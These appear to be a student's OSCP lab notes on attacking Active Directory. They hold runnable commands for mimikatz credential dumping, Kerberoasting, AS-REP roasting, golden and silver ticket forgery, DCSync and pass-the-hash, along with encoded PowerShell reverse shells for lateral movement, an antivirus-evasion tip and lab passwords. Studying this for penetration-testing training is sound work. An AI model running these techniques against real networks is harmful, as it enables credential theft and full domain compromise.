## Offsec Notes
First step in AD is to create a domain name, such as corp.com in which corp is often the name of the org itself.
AD environment has a critical dependency on the Domain Name System (DNS). Domain controllers, will also generally host authoritative DNS servers for the network
To ease management objects are grouped into Organizational Units (OUs)
	OUs are like file system folders, where objects in the OU represent actual servers and workstations
User objects can be assigned groups that give them elevated privileges. Members of *Domain Administrators* group are some of the highest privilege
There can be multiple Domain trees or domain
## Enumeration
### Manual Enumeration
Since every AD set has users and groups, let's start with those
we can use the net command to begin enumerating the  objects
```cmd
net user /domain
```
This command will print out all the users in the domain --> once we know the users we can start querying individual accounts
```cmd
net user jeffadmin /domain
```
We can also use the net command to enumerate groups
```cmd
net group /domain
```
Some groups are installed by default, we should try and enumerate custom groups first
```cmd
net group "Sales Department" /domain
```
### Enum via Powershell and .NET
Generally dedicated AD enumeration tools are in the Remote server Administration Tools (RSAT), which is usally only installed on DCs
We can use powershell and .Net classes to create scripts for enumeration
AD enumeration relies on LDAP --> the protocol used with Active Directory
An LDAP path prototype looks like this
```cmd
LDAP://HostName[:PortNumber][/DistinguishedName]
```
- Hostname: computer name, IP, or domain name
	- We want to look specifically for the Primary Domain Controller (PDC)
- Port Number: Optional argument,
- Distinguished name: Name that uniquely identifies object in the AD
To invoke the _Domain Class_ and the _GetCurrentDomain_ method, we'll run the following command in PowerShell:
```Powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```
This will reveal the PDC
First we can create a variable that will store the domain object
```Powershell
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Print the variable
$domainObj
```
We can extract the PdcRoleOwner property is required for the LDAP path, we can extract it from the domain object and store it in the PDC variable
```Powershell
# Store the PdcRoleOwner name to the $PDC variable
$PDC = $domainObj.PdcRoleOwner.Name
```
We can use ADSI directly in Powershell to retrieve the DN, since Domain object will give inconsistent formats
```Powershell
# Store the Distinguished Name variable into the $DN variable
$DN = ([adsi]'').distinguishedName
```
Now we can add an LDAP variable to piece together the full name

==Completed Script pt 1==
```Powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```
This script will dynamically retrieve the LDAP path

Now we can build in search functionality. We can use two .NET classes that are located in the  *System.DirectoryServices* namespace
	*DirectoryEntry* class encapsulates an object in the AD service hierarchy. We can use this to search from the very top of the structure. ==This is also where we can pass credentials if needed==
	*DirectorySearcher* used to perform queries against AD using LDAP. We want to use the SearchRoot property
The _DirectorySearcher_ documentation lists _FindAll()_,[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/active-directory-introduction-and-enumeration/active-directory-manual-enumeration/adding-search-functionality-to-our-script#fn4) which returns a collection of all the entries found in AD.

```Powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}
```
THis version above gets all the info on all of the user accounts
```Powershell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```
This version above allows us to send parameters to dynamically search like so `LDAPSearch -LDAPQuery "(samAccountType=805306368)"` or `LDAPSearch -LDAPQuery "(objectclass=group)"`
#### Enum with PowerView
PowerView is a powershell script which includes many functions for AD enumeration
If the module is present on the host machine we can import it using `Import-Module .\PowerView.ps1`
```Powershell
Get-NetDomain
```
The above command will get basic information about the domain
```Powershell
Get-NetUser
```
The above command gets a list of all users in the domain. It will automatically enumerate all attributes on the user object, which can lead to alot on info --> we can pipe resutls tro select to filter on certain attributes
```Powershell
Get-NetUser | select cn
```
The above command shows a cleaned up list of users in the domain
We can view multiple columns of info by selecting more than one attribute, use a comma separated list, no spaces
```Powershell
Get-NetUser | select cn,pwdlastset,lastlogon
```
Similar to the above function Get-NetGroup will enumerate groups in the AD --> we can also leave this blank and select cn to get all groups
```Powershell
Get-NetGroup "Sales Department" | select member
```

We can get information about the computer objects using the following command
```powershell
Get-NetComputer
```
We can select attributes to get a better network topology
```Powershell
Get-NetComputer | select operatingsystem,dnshostname
```
The following command in Powerview will find if our current user has local admin access on any computer in the domain
```Powershell
Find-LocalAdminAccess
```
We can check user logins on computers on the network using the following command
```Powershell
Get-NetSession -ComputerName files04 -Verbose
```
Note we may get access denied based on the machine we query. Also the output is only accurate for older systems
We can try a tool call PsLoggedon.exe for this enumeration task but it relies on remote registry being enabled. Remote registry is disabled by default
```Powershell
.\PsLoggedon.exe \\client74
```

==It's important to enumerate where users logged in to because credentials are stored in memory --> if we compromise / have admin access on those machines, we can gain creds of all users who authenticated on it==

There are a few types of service accounts: LocalSystem, LocalService, and NetworkService
The Service Principal Name (SPN) associates a service to a specific account an Active Directory --> We can query the DC for SPN info --> we can use setspn.exe which is installed by default
```cmd
setspn -L iis_service
```
-L indicates to run against both server and client
To enumerate against all SPNs we can use Powerview and pipe the output to select
```Powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### Enumerating Object Permissions
There are many permissions that can be set in AD. We are concerned mostly with the following:
	GenericAll: Full permissions on object
	GenericWrite: Edit certain attributes on the object
	WriteOwner: Change ownership of the object
	WriteDACL: Edit ACE's applied to object
	AllExtendedRights: Change password, reset password, etc.
	ForceChangePassword: Password change for object
	Self (Self-Membership): Add ourselves to for example a group
We can use Get-ObjectAcl in powerview to view Access control entries (ACE)
```Powershell
Get-ObjectAcl -Identity stephanie
```
This gives us a lot of output. In this case we are concerned with ObjectSID, ActiveDirectoryRights, and SID.
We can use Powerview's convert SID to name function to make output more readable
```
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```
This outputs shows us the name of the user stephanie for Object ID. To see who has read access to this object, we need to see what SID below translates to
```Powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
```
This SID belongs to a default AD group --> This doesn't get us anywhere. It is just an example of decoding info
The highest access permission we can have on an object is a generic all
We can query this in Powershell. The following command can query a specific object and will only output users that have the generic all rights
```Powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
This will output the SIDs on objects --> we can pipe them all to Convert-SidToName for human readable format
```Powershell
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```
In the list we see domain Admins have generic all (which is normal) but we also see Stephanie (our domain user account) has the Generic all permission --> **this is likely a misconfiguration any time a domain user has elevated access to an object**
We can use this permission to add ourself to the Management department group
### Enumerating Domain shares
Domain shares often contain critical info about the environment
We can sue the find-domainshare function of Powerview to help enumerate them
```Powershell
Find-DomainShare
```
We can add the -CheckShareAccess flag to display shares available to us.
We can query shares to inspect them. By default, the **SYSVOL** folder is mapped to **%SystemRoot%\\SYSVOL\\Sysvol\\domain-name** on the domain controller and every domain user has access to it.
```Powershell
ls \\dc1.corp.com\sysvol\corp.com\
```
In this case we find a file called oldpolicy.xml
Upon inspecting the file we see there is an encrypted password for local admin.
Usually the local admin password is changed through Group Policy Preferences (GPP). This would mean the  password is encrypted with AES-256 --> The decryption key has been posted on MSDN, so we can use it to decrypt passwords
Run the gpp-decrypt script in kali to get the password
```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

### Automated Enumeration
#### Collecting data with sharphound
Sharphound leverages many of thechniques previously discussed.
Import the sharphound midule on an AD windows host
```Powershell
Import-Module .\Sharphound.ps1
```
The first step is to invoke bloodhound
```Powershell
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```
This may take a few minutes to run
We can run the command `Get-Help Invoke-BloodHound` for info on other flags
**Note there is a looping feature that may make Bloodhound effective in real world / lab environments** --> if a user logs in after the scan we will mot have those credentials from just one scan
#### Analyzing Data with bloodhound
Start neo4j
```bash
sudo neo4j start
```
User: neo4j
Pass: password
The console will be available on localhost 7474 --> we shouldn't need to go in to this one

start bloodhound
```bash
bloodhound
```
Use neo4j creds for login
This command will pop up the console

**Need to drag and drop zip file in. ALso beware that we may need to use th ecollector under /usr/lib/bloodhound/resources/app/Collectors if we keep getting "bad JSON" error**

We can use built in queries under Analysis to get started
	Find shortest path to Domain Admin: WIll show shortest paths to domain admin. Useful to see ways to get there
We can mark nodes we own by navigating to them --> right click --> mark as owned. This will allow 

## Attacking Authentication
### NTLM
**NTLM is used when a client authenticates to a server by IP address (instead of hostname)**, or if the user attempts to authenticate to a hostname that is not registered on the AD DNS server. Likewise 3rd party applications may choose to use NTLM over Kerberos
Steps:
	Computer calculates NTLM hash
	Client sends username to server
	server returns a random value (nonce/challenge)
	Client encrypts the nonce using the NTLM hash (response) and sends to server
	Server forwards response, username, and nonce to the DC and DC authenticates request
### Kerberos
Kerberos Authentication uses a ticket system. The Domain controller is usually the Key Distribution Center (KDC).
Steps:
- User logs in and authenticates to DC
- DC replies with a session key and a ticket granting ticket (TGT)
	- Session key is encrypted using the user's password hash
	- The TGT contains info regarding the user, domain, timestamp, IP address of client, and session key. The TGT is encrypted by a secret key (NTLM hash of the krbgt account)
- Now when a user wants to access resources of the domain it must again contact the KDC. The client constructs a Ticket granting service request (TGS-REQ)
	- Consists of current user and a timestamp encrypted with the session key, name of resource and TGT
- Server performs multiple checks to authenticate the ticket
	- TGT must have valid timestamp
	- username from TGS-REQ must match username from TGT
	- Client IP needs to match TGT IP
- If verified the ticket granting service responds to the client with a ticket granting service reply (TGS-REP)
	- name of the service for which access has been granted
	- Session key to be used between client and server
	- Service ticket containing username, group memberships, and newly created session key
- The service ticket's service name and session key are encrypted using the original session key associated with the creation of the TGT. The service ticket itself is encrypted using the password hash of the service account registered for the service
- Now that the client has a service ticket and session key, service authentication begins
- Client sends the application server an Application Request (AP-REQ)
	- Includes username and timestamp encrypted with the session key along with the service ticket
- Application server decrypts the service ticket using service account password hash and extracts the username and timestamp encrypted with the session key. It uses the session key to decrypt the username and if it matches the one from the AP-REQ service is granted.
- Before access is granted the service inspects the supplied group memberships in the service and assigns appropriate permissions to the user, after which the user can access the requested service
### Cached AD Credentials
In the modern version of Windows, password hashes are stored in the Local Security Authority Subsystem Service (LSASS)
If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions
*We need to be SYSTEM or Local Admin to gain access to stored creds on a target* --> we usually have to do a local priv esc on our target
One of the most popular tools for credential extraction is Mimikatz
	In the following example, we will run Mimikatz as a standalone application. However, due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the _Antivirus Evasion_ Module instead. For example, execute Mimikatz directly from memory using an injector like PowerShell,[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/understanding-active-directory-authentication/cached-ad-credentials#fn4) or use a built-in tool like Task Manager to dump the entire LSASS process memory,[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/understanding-active-directory-authentication/cached-ad-credentials#fn5) move the dumped data to a helper machine, and then load the data into Mimikatz.[6](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/understanding-active-directory-authentication/cached-ad-credentials#fn6)

==In an administrator Powershell==
```Powershell
.\mimkatz.exe
Privilege::debug
sekurlsa::logonpasswords
```
This will get us the NTLM and SHA1 hashes of all stored user credentials
We can also use mimikatz to harvest tickets stored on the local computer
```Powershell
sekurlsa::tickets
```
This will show us the tickets stored on the computer. Mimikatz has functions to import and export tickets for further Kerberos abuse --> covered in next section.
### Performing Attacks on AD Auth
#### Password Attacks
We should try and figure out the lockout policy before trying to brute force passwords --> AD usually has lockout policies that could prevent further access to accounts
```Powershell
net accounts
```
This will show the password policy
Password sparying can be more effective int his case --> make a short list of known passwords and try against all users
There is a script offsec provided in a vm that quires the Domain controller as another user. Copied to Kali
We can also conduct password spraying via crackmapexec. We can construct a text file with target users and run this tool against it
```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
-u: file of usernames
-p: password to test
-d: domain
The third type of password spraying can be used to get a TGT using *kinit*
	This tool will send an AS-REQ and examine the response to see if authentication worked
**The tool *kerbrute* automates the kinit technique and can be used cross platform**
#### AS-REP Roasting
The DC sends an AS-REP after we send an AS-REQ as the first step of authenticating on AD. If preauthentication is disabled we can perform offline password guessing attacks against. By default *Do not require Kerberos Preauthentication* is disabled. However, we can enable it if we get control of an account. Additionally, some object may have this enabled to function properly
We can use the tool impacket-GetNPUsers to perform AS-REP roasting. **Note this tool requires you to have a foothold on the network**
```bash
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```
-dc-ip is the domain controller IP
-output file will output any hashes in hashcat form
If any results are returned, we can run hashcat against them
```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
mode 18200 is for Kerberos AS-REP

We can also use the tool Rubeus for AS-REP roasting on Windows
```Powershell
.\Rubeus.exe asreproast /nowrap
```
We can copy/paste the output into a text file and run hashcat against it like before
To Identify users with *Do not require Kerberos preauthentication* We can also use the following on windows
```Powershell
Import-module .\Powerview.ps1
Get-DomainUser -PreauthNotRequired
```
Or on Kali
```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete
```
If we have GenericWrite or GenericAll over another user we could change the password or in a real world situation turn off Kereberos preauth ot use this technique against them
#### Kerberoasting
When requesting a service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service itself --> this is performed only when connecting to the service
If we know which Service Principle Name (SPN) we want to target we can request a service ticket from the DC and attempt to decrypt the ticket --> this would give us the hash of the SPN's password.
We can use Rubeus to attempt to gain the hash for Kerberoasting
```Powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
Once we have a hash, we can again use hashcat to attempt to crack it
```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
From Linux we can use the tool impacket-GetUserSPNs to try and get a SPN hash
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```
==Note:== If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use _ntpdate_[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn3) or _rdate_[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn4) to do so.
If the SPN runs in the context of a computer account, a managed service account, or a group-managed service account the password will be randomly generated and impossible to crack
#### Silver Tickets
User and group permissions set in the service tickets are not verified by the service account --> if we can forge tickets we can grant ourselves custom permissions
*Privileged Account Certificate* validation is an optional verification process between the SPN application and DC. This attack will not work if it is enabled, but it rarely is
With the service account password or associated NTLM hash we can forge our own tickets to access the target resource --> this is a silver ticket
If the Service Principle Name (SPN) is used on multiple servers the silver ticket can be leveraged against all of them
In this example we wil create a silver ticket against the iis_service user account which is mapped to an HTTP SPN
Let's assume the iis_service user has an established session on a the target computer
In general, we need to collect the following three pieces of information to create a silver ticket:
- SPN password hash
- Domain SID
- Target SPN
If we have local admin on the target computer we can use Mimikatz to extract the NTLM hash of iis_service
```mimikatz
privilege::debug
sekurlsa::logonpasswords
```
Obtain the domain SID
We can get it from mimikatz output or the following command
```Powershell
whoami /user
```
Output looks like `corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105`
Remember SIDs have a few parts (covered in the Windows priv esc notes)
We want to cut out the domain SID so we emit the RID of the user -->
`S-1-5-21-1987370270-658905905-1781884369`
Lastly we need the target SPN. We will target the HTTP SPN resource running on WEB04 machine
Now we can use Mimikatz to forge the silver ticket
```mimkatz
privilege::debug
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
/ptt injects the ticket into the memoryof the machine we execute the command on
/rc4: is the NTLM hash of the SPN (there is also a differnet hashing protocol that can be used. Be aware of this)
/user can be any user since we can set permissions ourselves, but best to use the user we are running as
Once we have the forged ticket we should be able to access the SPN
==Note==:  Microsoft created a security patch to update the PAC structure.[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/silver-tickets#fn5) With this patch in place, the extended PAC structure field _PAC_REQUESTOR_ needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.
#### Domain controller Synchronization (DCSYNC)
In production environments there are usually multiple DCs for redundancy.
The DCs sync using the Direcotry Replication Service (DRS) remote protocol
A DC may request an update using the IDL_DRSGetNCChanges API. --> **The DC receiving this update does not check whether the request came from a DC**. Instead it just checks to make surethe associated SID has proper privileges. --> If we have a user with the correct rights we can succeed in sending a rogue request.
==We need to be part of one of the fallowing groups==
- Domain Admin
- Enterprise Admins
- Administrators
To run this attack on windows we can can use Mimikatz to obtain credentials of other users
==BrouhahaTungPerorateBroom2023!==
```mimikatz
lsadump::dcsync /user:corp\dave
```
In this example corp is the domain and dave is the user we want to target.
We receive an NTLM hash of daves password which we can save off and crack with hashcat
```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
==Note== We can use this to get the hash of any user in the system including the domain admin --> `lsadump::dcsync /user:corp\Administrator`
If we are on the Kali linux box, we can do this with impacket-secretdump
```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
Generally that is
```bash
impacket-secretdump -just-dc-user <target> <domain>/<foothold user>:<FU password>@<DC IP>
```

## Lateral movement techniques
### WMI and WinRM
Windows Management Instrumentation (WMI) is capable of creating processes via the Create method from the Win32_Process class. It communicates through RPC on port 135 for remote access and higher range ports for session data
==In order to create a process on the remote target via WMI **We need the credentials of a member of the Administrators local group on the target machine==
Note: Unlike non-domain joined machines, there is no UAC remote restrictions when for domain users, so we can maintain privilege while moving laterally.
the wmic utility is used to remotely spawn process on domain computers
```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```
this command reutns a value of 0 because all system processes and services run in Session 0
To translate this to a pwoershell attack, we need a few more details. We need to create a PSCredential object
```Powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```
Next we need to create a Common Information Model (CIM) via the New-CimSession cmdlet
```Powershell
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
```
FInally we need to invoke the CIM session using Invoke-CimMethod cmdlet
```Powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
The above command will launch the calculator process on a remote computer. We have to do a little more editing to receive a reverse shell
**We need to base64 encode the powershell payload so we don't accidentally escape any special characters**
Offsec provided a script, copied to ~/oscp/powershell_reverse_shell_encoder.py
Now if we put it all together and switch to the encoded command, it looks like this
```Powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
and we receive a reverse shell as jen (we sent the command as jeff)
For an alternative method we can also use WinRM
a utility of WinRM is windows remote shell (winrs).
```cmd
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
```
-r is the host
-u is user
-p password
==For WinRS to work the user must be part of the administrators or remote management group==
To gain a reverse shell, we can use the same encoded command as before
```cmd
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```
Powershell also has WinRM built in capabilities called PowerShell remoting which can be invoked by the New-PSSession cmdlet.
We need to provide the IP of the host and the credential object like before
```Powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```
To interact with the new session we use th eEnter-PSSession cmdlet followed by the ID
```Powershell
Enter-PSSession 1
```

#### PsExec
PsExec is a versatile tool that was developed to replace telnet-like applications and provide remote execution of processes
In order to misuse this tool for lateral movement a few prereqs must be met
- User must be part of the Administrators local group (on host)
- ADMIN$ share must be available
- File and Printer sharing must be on
The last two requirements are default on windows systems
PsExec is not installed by default but we can move the whole SysinternalSuite over if we need it
```Powershell
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```
-i target prepended by \\\\
-u user in the form of domain\\username
-p password
last argument is the process we want to execute
#### Pass the Hash
Pass the hash technique allows an attacker to authenticate to a remote system or service using the user's ntlm hash instead of plaintext password
==Note this only works for servers using ntlm authentication. Will not work for Kerberos==
Unless we want to gain remote code execution PtH does not need to create a windows service
Similar to PsExec, PtH needs connection to port 445 (SMB) on the remote host, and Windows File and Printer Sharing feature turned on. Also requires local Admin rights
In this example we pass the hash of the Administrator account we already recovered.
```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
Note there are many tool kits to do this including _PsExec_ from Metasploit,[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/lateral-movement-in-active-directory/active-directory-lateral-movement-techniques/pass-the-hash#fn1) _Passing-the-hash toolkit_,[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/lateral-movement-in-active-directory/active-directory-lateral-movement-techniques/pass-the-hash#fn2) and _Impacket_.[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/lateral-movement-in-active-directory/active-directory-lateral-movement-techniques/pass-the-hash#fn3)
#### Overpass the Hash
If we find cached credentials from another user we can attempt to use them to gain a Kerberos ticket without NTLM Authentication
We can Mimikatz use mimikatz
```mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<user hash> /run:powershell
```
This will give us a powershell session as the targeted user
No Kerberos tickets have been cached at this point --> we need to use a domain service as the user. Example we can access another server
```Powershell
net use \\files04
```
**Note: Make sure the targeted user has permission to access the target machine.** This step will appear successful and there will be a stored Kerberos ticket, but PsExec might fail if the user doesn't have proper permission to access the target
Now we can use klist to see the cached ticket --> We have successfully turned an NTLM hash into a Kerberos Ticket --> **Ticket didn't show up for klist in the powershell screen launched but psexec worked**
We can now use PsExec to launch a remote shell on another machine as our impersonated user
```Powershell
.\PsExec.exe \\files04 cmd
```

#### Pass the Ticket
For Overpass the hash we can only gain access to the machine we generated the ticket for. With pass the ticket we generate a TGS that can be reused across the network.
Additionally, if the ticket is for the current user we don't need admin privileges.
In this example we are logged in as Jen and want to gain access to Dave's ticket. Dave has access to an admin folder on web04
```Mimikatz
privilege::debug
sekurlsa::tickets /export
```
We can then examine all of the exported tickets
```Powershell
dir *.kirbi
```
In the ticket  we see the form (stuff)-user@resource access
We can choose a ticket with our targeted resource
in this example it would be `[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`
```mimikatz
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
If no errors are thrown we should expect to see the ticket when running klist
we should now have access tot he targeted resource
#### DCOM
Interaction with DCOM is performed with RPC with TCP over port 135 and **local admin access is required to call DCOM Service Control Manager**
The DCOM lateral movement atechnique is based on Microsoft Management Console (MMC) application that is employed for scripted automation of Windows systems
MMC Application class allows for Application Objects, which expose the ExecuteShellCOmmand method under the Document.ActiveView property
This allows execution of any shell command as long as the authenticated user is authorized, which is the default for local admins
From an ***elevated*** Powershell prompt
```Powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```
once the application object is saved to the DCOM variable, we can pass the required argument to the application
```Powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```
The ExecuteShellCommand method takes 4 parameters
- Command
- Directory
- Parameters
- WindowState
We are only concerned with 1 and 3
We can edit the command to launch an encoded reverse shell like the WMI section --> we can use the python script in ~/oscp
```Powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

### Active Directory Persistence
#### Golden Tickets
If we can get our hands on the password hash of the krbtgt account, we would be able to generate our own TGT, known as golden tickets --> This would give us permission over the entire domain's resources
We can run mimikatz to recover the krbtgt hash
```Mimikatz
privilege::debug
lsadump::lsa /patch
```
If we find the krbtgt hash here we can create a golden ticket --> Note, we don't need to have admin privileges to inject this ticket into memory. I tcan be done from any shell
```mimikatz
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```
Generally, that is 
```mimikatz
kerberos::golden /user:<current user> /domain:<domain> /sid: <domain sid> /krbtgt:<krbtgt hash> /ptt
```
Domain SID can be gathered using `whoami /user`
/ptt will inject the ticket into the current session. There is another flag to just save the ticket in a file (I think /path)
we can now launch a new command prompt and access anything we want on the domain
```mimikatz
misc::cmd
```
```cmd
PsExec.exe \\dc1 cmd.exe
```
**NOTE: Because we have a ticket we must supply a hostname to use Kerberos Authentication. If we supplied an IP NTLM authentication will be used and access will be denied** --> make sure we are using the ticket
#### Shadow Copies
Volume Shadow Service (VSS) is a Microsoft backup technology that allows the creation of snapshots of files or volumes.
To manage shadow copies we can use vshadow.exe
We can abuse this tool to create a shadow copy that will allow us to extract the AD database **NTDS.dit** file --> once we have a copy we can extract every user credential on kali linux.
**In this example we have admin privileges on the domain controller**
```cmd
vshadow.exe -nw -p C:
```
We need to take note of the "shadow copy device name" output by this command so we can copy the ntds.dir database
```cmd
copy <shadow copy device name>\windows\ntds\ntds.dit c:\ntds.dit.bak
```
Lastly, we need to extract the system hive from windows registry
```cmd
reg.exe save hklm\system c:\system.bak
```
We need to exfiltrate the .bak files to our kali machine
Once on kali we can use impacket-secretsdump to dump all the hashes
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
This will output all hashes and is equivalent to running mimikatz to dump password hashes on the DC


If we have generic all permissions over the DC, we can conduct a resource based constrained delegation attack detailed here: https://medium.com/@husamkhan2014/proving-grounds-resourced-dc-writeup-50c25c5a23c5


# THM notes
The core of any Windows Domain is the Active Directory Domain Service (AD DS). This service acts as a catalogue that holds the information of all of the "objects" that exist on your network. Amongst the many objects supported by AD, we have users, groups, machines, printers, shares and many others. Let's look at some of them:

Users are one of the most common object types in Active Directory. Users are one of the objects known as security principals, meaning that they can be authenticated by the domain and can be assigned privileges over resources like files or printers. You could say that a security principal is an object that can act upon resources in the network.
Users can be used to represent two types of entities
    People: users will generally represent persons in your organization that need to access the network, like employees.
    Services: you can also define users to be used by services like IIS or MSSQL. Every single service requires a user to run, but service users are different from regular users as they will only have the privileges needed to run their specific service

Machines are another type of object within Active Directory; for every computer that joins the Active Directory domain, a machine object will be created. Machines are also considered "security principals" and are assigned an account just as any regular user. This account has somewhat limited rights within the domain itself.

